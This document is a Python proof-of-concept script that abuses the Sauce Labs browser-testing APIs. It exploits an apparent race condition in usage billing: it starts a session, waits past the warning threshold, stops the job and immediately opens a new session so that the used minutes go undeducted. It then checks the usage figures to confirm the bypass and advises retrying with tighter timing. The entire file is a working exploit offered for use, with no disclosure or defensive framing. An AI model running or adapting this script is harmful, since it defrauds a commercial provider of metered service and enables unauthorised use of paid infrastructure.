import requests
import time
import json

# Your Sauce Labs creds—swap these in
USERNAME = "your_username_here"
ACCESS_KEY = "your_access_key_here"
HUB_URL = "https://ondemand.us-west-1.saucelabs.com:443/wd/hub"
API_URL = "https://api.us-west-1.saucelabs.com"

# Headers for auth
auth = (USERNAME, ACCESS_KEY)
headers = {'Content-Type': 'application/json'}

def start_session():
    payload = {
        "desiredCapabilities": {
            "username": USERNAME,
            "accessKey": ACCESS_KEY,
            "browserName": "chrome",
            "platform": "Windows 10",
            "version": "latest",
            "name": "Exploit Test Session"
        }
    }
    response = requests.post(f"{HUB_URL}/session", json=payload, auth=auth, headers=headers)
    if response.status_code == 200:
        session_data = response.json()
        session_id = session_data['sessionId']
        print(f"[+] Session started: {session_id}")
        return session_id
    else:
        print(f"[-] Failed to start session: {response.text}")
        return None

def stop_session(session_id):
    # First, get the job ID from the session (Sauce maps session to job)
    # Query recent jobs to snag the job_id—filter by name or time
    now = int(time.time())
    response = requests.get(f"{API_URL}/rest/v1/{USERNAME}/jobs?full=true&limit=1&sort=started&order=desc", auth=auth)
    if response.status_code == 200:
        jobs = response.json()
        if jobs:
            job_id = jobs[0]['id']
            print(f"[+] Stopping job: {job_id} for session {session_id}")
            # Hit the stop endpoint
            stop_response = requests.put(f"{API_URL}/rest/v1/{USERNAME}/jobs/{job_id}/stop", auth=auth)
            if stop_response.status_code == 200:
                print(f"[+] Session stopped successfully")
                return True
            else:
                print(f"[-] Stop failed: {stop_response.text}")
        else:
            print("[-] No recent jobs found")
    else:
        print(f"[-] Failed to fetch jobs: {response.text}")
    return False

def check_usage():
    # Quick peek at recent activity minutes (daily aggregate, but shows changes post-run)
    response = requests.get(f"{API_URL}/rest/v1/{USERNAME}/activity?level=user", auth=auth)
    if response.status_code == 200:
        data = response.json()
        recent_day = data['minutes'][-1] if data['minutes'] else 0
        print(f"[INFO] Recent daily minutes used: {recent_day}")
        return recent_day
    print("[-] Couldn't fetch usage")
    return 0

# Main exploit loop—run this to trigger the race
print("[*] Starting exploit simulation...")
initial_usage = check_usage()
print(f"[INFO] Initial usage snapshot: {initial_usage} mins")

# Step 1: Start session
session_id = start_session()
if not session_id:
    exit(1)

# Step 2: Simulate running past 3-min warning (wait 7 mins for 10-min limit)
print("[*] Running session... waiting 7 minutes to pass warning threshold")
time.sleep(420)  # 7 minutes—tweak if your warning hits earlier

# Step 3: End session prematurely (the race trigger)
stop_session(session_id)

# Step 4: Immediately start new session before deduction hits
print("[*] Firing up new session to bypass deduction...")
new_session_id = start_session()
if new_session_id:
    print("[+] Exploit complete—check dashboard for undeducted minutes!")
    # Optional: Stop the new one quick too, or let it run
    time.sleep(10)  # Quick burn
    stop_session(new_session_id)
else:
    print("[-] New session failed—timing might be off")

final_usage = check_usage()
print(f"[INFO] Final usage snapshot: {final_usage} mins")
if final_usage == initial_usage:
    print("[!] BINGO! No deduction—vulnerability confirmed.")
else:
    print(f"[?] Usage changed to {final_usage}—run again with tighter timing.")
